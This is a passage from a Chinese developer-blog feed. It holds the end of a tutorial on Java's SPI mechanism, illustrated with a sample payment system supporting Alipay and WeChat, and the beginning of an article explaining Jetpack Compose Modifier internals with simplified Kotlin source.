<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(LoggingService.class);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrder</span><span class="hljs-params">(Order order)</span> {
        logger.info(<span class="hljs-string">"开始处理订单: {}"</span>, order.getId());

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 业务逻辑</span>
            logger.debug(<span class="hljs-string">"订单金额: {}"</span>, order.getAmount());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            logger.error(<span class="hljs-string">"处理订单失败"</span>, e);
            <span class="hljs-keyword">throw</span> e;
        }

        logger.info(<span class="hljs-string">"订单处理完成"</span>);
    }
}
</code></pre>
<h3 data-id="heading-24">6.2 实际生产案例：支付系统</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/419187ab020d4594b1d153357d3c1e39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770254152&amp;x-signature=DekGrbnEliD41lrHxuIZ%2Fhu%2FNWE%3D" alt="" loading="lazy"/></p>
<p><strong>场景</strong>：支持多种支付方式（支付宝、微信、银联）</p>
<p><strong>支付接口定义</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.payment.spi;

<span class="hljs-comment">/**
 * 支付服务接口
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaymentService</span> {

    <span class="hljs-comment">/**
     * 创建支付订单
     * <span class="hljs-doctag">@param</span> request 支付请求
     * <span class="hljs-doctag">@return</span> 支付结果
     */</span>
    PaymentResult <span class="hljs-title function_">createPayment</span><span class="hljs-params">(PaymentRequest request)</span>;

    <span class="hljs-comment">/**
     * 查询支付状态
     * <span class="hljs-doctag">@param</span> paymentId 支付订单号
     * <span class="hljs-doctag">@return</span> 支付状态
     */</span>
    PaymentStatus <span class="hljs-title function_">queryStatus</span><span class="hljs-params">(String paymentId)</span>;

    <span class="hljs-comment">/**
     * 申请退款
     * <span class="hljs-doctag">@param</span> refundRequest 退款请求
     * <span class="hljs-doctag">@return</span> 退款结果
     */</span>
    RefundResult <span class="hljs-title function_">refund</span><span class="hljs-params">(RefundRequest refundRequest)</span>;

    <span class="hljs-comment">/**
     * 获取支付方式
     * <span class="hljs-doctag">@return</span> 支付方式名称
     */</span>
    String <span class="hljs-title function_">getPaymentType</span><span class="hljs-params">()</span>;
}
</code></pre>
<p><strong>支付宝实现</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">payment</span>.<span class="hljs-property">impl</span>;

<span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">payment</span>.<span class="hljs-property">spi</span>.*;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">alipay</span>.<span class="hljs-property">api</span>.<span class="hljs-property">AlipayClient</span>;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">alipay</span>.<span class="hljs-property">api</span>.<span class="hljs-property">DefaultAlipayClient</span>;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">alipay</span>.<span class="hljs-property">api</span>.<span class="hljs-property">request</span>.<span class="hljs-property">AlipayTradeCreateRequest</span>;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">alipay</span>.<span class="hljs-property">api</span>.<span class="hljs-property">response</span>.<span class="hljs-property">AlipayTradeCreateResponse</span>;

<span class="hljs-comment">/**
 * 支付宝支付实现
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AlipayPaymentService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">AlipayClient</span> alipayClient;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">AlipayPaymentService</span>() {
        <span class="hljs-comment">// 初始化支付宝客户端</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">alipayClient</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultAlipayClient</span>(
            <span class="hljs-string">"https://openapi.alipay.com/gateway.do"</span>,
            <span class="hljs-string">"APP_ID"</span>, <span class="hljs-string">"PRIVATE_KEY"</span>, <span class="hljs-string">"json"</span>, <span class="hljs-string">"UTF-8"</span>, <span class="hljs-string">"ALIPAY_PUBLIC_KEY"</span>
        );
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PaymentResult</span> <span class="hljs-title function_">createPayment</span>(<span class="hljs-params">PaymentRequest request</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">AlipayTradeCreateRequest</span> alipayRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlipayTradeCreateRequest</span>();
            alipayRequest.<span class="hljs-title function_">setBizContent</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">format</span>(
                <span class="hljs-string">"{"</span>out_trade_no<span class="hljs-string">":"</span>%s<span class="hljs-string">","</span>total_amount<span class="hljs-string">":"</span>%s<span class="hljs-string">","</span>subject<span class="hljs-string">":"</span>%s<span class="hljs-string">"}"</span>,
                request.<span class="hljs-title function_">getOrderNo</span>(), request.<span class="hljs-title function_">getAmount</span>(), request.<span class="hljs-title function_">getSubject</span>()
            ));

            <span class="hljs-title class_">AlipayTradeCreateResponse</span> response = alipayClient.<span class="hljs-title function_">execute</span>(alipayRequest);

            <span class="hljs-keyword">if</span> (response.<span class="hljs-title function_">isSuccess</span>()) {
                <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentResult</span>.<span class="hljs-title function_">success</span>(response.<span class="hljs-title function_">getTradeNo</span>());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentResult</span>.<span class="hljs-title function_">fail</span>(response.<span class="hljs-title function_">getSubMsg</span>());
            }
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentResult</span>.<span class="hljs-title function_">fail</span>(<span class="hljs-string">"支付异常: "</span> + e.<span class="hljs-title function_">getMessage</span>());
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PaymentStatus</span> <span class="hljs-title function_">queryStatus</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> paymentId</span>) {
        <span class="hljs-comment">// 查询支付状态实现</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentStatus</span>.<span class="hljs-property">PAID</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RefundResult</span> <span class="hljs-title function_">refund</span>(<span class="hljs-params">RefundRequest refundRequest</span>) {
        <span class="hljs-comment">// 退款实现</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">RefundResult</span>.<span class="hljs-title function_">success</span>();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPaymentType</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ALIPAY"</span>;
    }
}
</code></pre>
<p><strong>微信支付实现</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">payment</span>.<span class="hljs-property">impl</span>;

<span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">payment</span>.<span class="hljs-property">spi</span>.*;

<span class="hljs-comment">/**
 * 微信支付实现
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WechatPaymentService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentService</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PaymentResult</span> <span class="hljs-title function_">createPayment</span>(<span class="hljs-params">PaymentRequest request</span>) {
        <span class="hljs-comment">// 微信支付统一下单实现</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentResult</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"WX"</span> + request.<span class="hljs-title function_">getOrderNo</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">PaymentStatus</span> <span class="hljs-title function_">queryStatus</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> paymentId</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">PaymentStatus</span>.<span class="hljs-property">PAID</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RefundResult</span> <span class="hljs-title function_">refund</span>(<span class="hljs-params">RefundRequest refundRequest</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">RefundResult</span>.<span class="hljs-title function_">success</span>();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPaymentType</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"WECHAT"</span>;
    }
}
</code></pre>
<p><strong>支付服务工厂</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.payment;

<span class="hljs-keyword">import</span> com.example.payment.spi.PaymentService;
<span class="hljs-keyword">import</span> com.example.payment.spi.PaymentRequest;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.ServiceLoader;

<span class="hljs-comment">/**
 * 支付服务工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentServiceFactory</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, PaymentService&gt; SERVICE_MAP = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 通过SPI加载所有支付实现</span>
        ServiceLoader&lt;PaymentService&gt; loader = ServiceLoader.load(PaymentService.class);
        <span class="hljs-keyword">for</span> (PaymentService service : loader) {
            SERVICE_MAP.put(service.getPaymentType(), service);
            System.out.println(<span class="hljs-string">"注册支付服务: "</span> + service.getPaymentType());
        }
    }

    <span class="hljs-comment">/**
     * 根据支付类型获取支付服务
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PaymentService <span class="hljs-title function_">getPaymentService</span><span class="hljs-params">(String paymentType)</span> {
        <span class="hljs-type">PaymentService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> SERVICE_MAP.get(paymentType);
        <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"不支持的支付方式: "</span> + paymentType);
        }
        <span class="hljs-keyword">return</span> service;
    }

    <span class="hljs-comment">/**
     * 创建支付订单
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createPayment</span><span class="hljs-params">(String paymentType, PaymentRequest request)</span> {
        <span class="hljs-type">PaymentService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> getPaymentService(paymentType);
        System.out.println(<span class="hljs-string">"使用 "</span> + paymentType + <span class="hljs-string">" 支付..."</span>);
        <span class="hljs-type">var</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.createPayment(request);

        <span class="hljs-keyword">if</span> (result.isSuccess()) {
            System.out.println(<span class="hljs-string">"支付创建成功: "</span> + result.getTransactionId());
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"支付失败: "</span> + result.getErrorMessage());
        }
    }
}
</code></pre>
<p><strong>配置文件</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"># META-INF/services/com.example.payment.spi.PaymentService
com.example.payment.<span class="hljs-keyword">impl</span>.AlipayPaymentService
com.example.payment.<span class="hljs-keyword">impl</span>.WechatPaymentService
</code></pre>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.payment;

<span class="hljs-keyword">import</span> com.example.payment.spi.PaymentRequest;
<span class="hljs-keyword">import</span> java.math.BigDecimal;

<span class="hljs-comment">/**
 * 支付系统使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentSystemDemo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建支付请求</span>
        <span class="hljs-type">PaymentRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaymentRequest</span>();
        request.setOrderNo(<span class="hljs-string">"ORDER20240101001"</span>);
        request.setAmount(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"99.99"</span>));
        request.setSubject(<span class="hljs-string">"测试商品"</span>);

        <span class="hljs-comment">// 使用支付宝支付</span>
        PaymentServiceFactory.createPayment(<span class="hljs-string">"ALIPAY"</span>, request);

        <span class="hljs-comment">// 使用微信支付</span>
        PaymentServiceFactory.createPayment(<span class="hljs-string">"WECHAT"</span>, request);
    }
}
</code></pre>
<h2 data-id="heading-25">七、总结</h2>
<p>Java SPI机制是一种优雅的服务发现和扩展机制，它通过约定配置文件的方式，实现了：</p>
<ol>
<li><strong>解耦</strong>：核心框架与具体实现分离</li>
<li><strong>扩展</strong>：第三方可以轻松提供实现</li>
<li><strong>灵活</strong>：支持动态切换实现</li>
</ol>
<blockquote>
<p>掌握SPI机制，不仅能更好地理解开源框架的设计思想，还能在实际项目中实现更优雅的架构设计。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jetpack Compose 从入门到精通（二）：核心基石 - 深入理解 Modifier 与布局系统]]></title>    <link>https://juejin.cn/post/7600342663319388201</link>    <guid>https://juejin.cn/post/7600342663319388201</guid>    <pubDate>2026-01-29T03:31:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600342663319388201" data-draft-id="7600430748780445739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jetpack Compose 从入门到精通（二）：核心基石 - 深入理解 Modifier 与布局系统"/> <meta itemprop="keywords" content="Android,Kotlin,JetBrains"/> <meta itemprop="datePublished" content="2026-01-29T03:31:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="邹阿涛涛涛涛涛涛涛涛"/> <meta itemprop="url" content="https://juejin.cn/user/3808364009106839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jetpack Compose 从入门到精通（二）：核心基石 - 深入理解 Modifier 与布局系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808364009106839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    邹阿涛涛涛涛涛涛涛涛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T03:31:20.000Z" title="Thu Jan 29 2026 03:31:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    19
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本篇文章将从源码层面深入解析 Compose 的核心机制，帮助你真正理解 Modifier 的设计哲学、布局系统的测量流程，以及 LazyColumn 的惰性加载原理。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">前言</h2>
<p>在上一篇中，我们完成了 Compose 的入门。但如果你只停留在"会用"的层面，遇到复杂场景时就会束手无策。比如：</p>
<ul>
<li>为什么 Modifier 的调用顺序会影响最终效果？</li>
<li>LazyColumn 为什么能流畅处理上万条数据？</li>
<li>自定义 Layout 时，Constraints 到底该怎么用？</li>
<li>什么时候应该用 ConstraintLayout，什么时候用嵌套 Column/Row？</li>
</ul>
<p>本篇文章将带你<strong>深入原理层</strong>，不仅告诉你"怎么做"，更要让你理解"为什么这样做"。准备好了吗？让我们开始深度探索！</p>
<hr/>
<h2 data-id="heading-1">一、Modifier 深度解析：从设计哲学到源码实现</h2>
<h3 data-id="heading-2">1.1 为什么需要 Modifier？</h3>
<p>在传统 View 系统中，每个 View 都有一大堆属性方法：<code>setPadding()</code>、<code>setBackground()</code>、<code>setOnClickListener()</code>... 这不仅让 View 类变得臃肿，也限制了扩展性。</p>
<p>Compose 采用了完全不同的设计：<strong>将修饰能力从组件中分离出来</strong>，形成独立的 Modifier 系统。</p>
<p><strong>设计哲学</strong>：</p>
<ul>
<li><strong>单一职责</strong>：Text 只负责显示文字，修饰交给 Modifier</li>
<li><strong>可组合</strong>：通过链式调用组合各种修饰效果</li>
<li><strong>可扩展</strong>：随时可以增加新的 Modifier，无需修改组件</li>
</ul>
<h3 data-id="heading-3">1.2 Modifier 的本质：接口与链表</h3>
<p>Modifier 是一个<strong>接口</strong>，它的核心设计非常精巧：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 简化版源码</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Modifier</span> {
    <span class="hljs-comment">// 从左到右遍历所有 Element</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldIn</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">R</span>, <span class="hljs-type">Element</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R
    
    <span class="hljs-comment">// 从右到左遍历所有 Element</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldOut</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">Element</span>, <span class="hljs-type">R</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R
    
    <span class="hljs-comment">// 检查是否有满足条件的 Element</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">any</span><span class="hljs-params">(predicate: (<span class="hljs-type">Element</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    
    <span class="hljs-comment">// 检查是否所有 Element 都满足条件</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">all</span><span class="hljs-params">(predicate: (<span class="hljs-type">Element</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    
    <span class="hljs-comment">// 组合两个 Modifier</span>
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">then</span><span class="hljs-params">(other: <span class="hljs-type">Modifier</span>)</span></span>: Modifier
    
    <span class="hljs-comment">// 空的 Modifier 实例</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> : Modifier {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldIn</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">R</span>, <span class="hljs-type">Element</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R = initial
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldOut</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">Element</span>, <span class="hljs-type">R</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R = initial
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">then</span><span class="hljs-params">(other: <span class="hljs-type">Modifier</span>)</span></span>: Modifier = other
    }
}
</code></pre>
<p><strong>关键设计</strong>：Modifier 内部使用<strong>链表结构</strong>存储所有的修饰元素。</p>
<h3 data-id="heading-4">1.3 链式调用的秘密</h3>
<p>当我们写下这样的代码时，发生了什么？</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Modifier
    .padding(<span class="hljs-number">16.</span>dp)
    .background(Color.Blue)
    .size(<span class="hljs-number">100.</span>dp)
</code></pre>
<p><strong>执行过程</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">步骤</span> <span class="hljs-attr">1:</span> <span class="hljs-string">Modifier</span> <span class="hljs-string">(空)</span> 
        <span class="hljs-string">↓</span> <span class="hljs-string">then()</span>
<span class="hljs-string">步骤</span> <span class="hljs-attr">2:</span> <span class="hljs-string">Modifier</span> <span class="hljs-string">+</span> <span class="hljs-string">PaddingModifier</span>
        <span class="hljs-string">↓</span> <span class="hljs-string">then()</span>
<span class="hljs-string">步骤</span> <span class="hljs-attr">3:</span> <span class="hljs-string">Modifier</span> <span class="hljs-string">+</span> <span class="hljs-string">PaddingModifier</span> <span class="hljs-string">+</span> <span class="hljs-string">BackgroundModifier</span>
        <span class="hljs-string">↓</span> <span class="hljs-string">then()</span>
<span class="hljs-string">步骤</span> <span class="hljs-attr">4:</span> <span class="hljs-string">Modifier</span> <span class="hljs-string">+</span> <span class="hljs-string">PaddingModifier</span> <span class="hljs-string">+</span> <span class="hljs-string">BackgroundModifier</span> <span class="hljs-string">+</span> <span class="hljs-string">SizeModifier</span>
</code></pre>
<p><strong>源码实现</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Modifier.kt</span>
<span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">then</span><span class="hljs-params">(other: <span class="hljs-type">Modifier</span>)</span></span>: Modifier = 
    <span class="hljs-keyword">if</span> (other === Modifier) <span class="hljs-keyword">this</span> <span class="hljs-keyword">else</span> CombinedModifier(<span class="hljs-keyword">this</span>, other)

<span class="hljs-comment">// CombinedModifier 将两个 Modifier 组合在一起</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CombinedModifier</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> outer: Modifier,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> <span class="hljs-keyword">inner</span>: Modifier
) : Modifier {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldIn</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">R</span>, <span class="hljs-type">Modifier</span>.<span class="hljs-type">Element</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
        <span class="hljs-keyword">inner</span>.foldIn(outer.foldIn(initial, operation), operation)
    
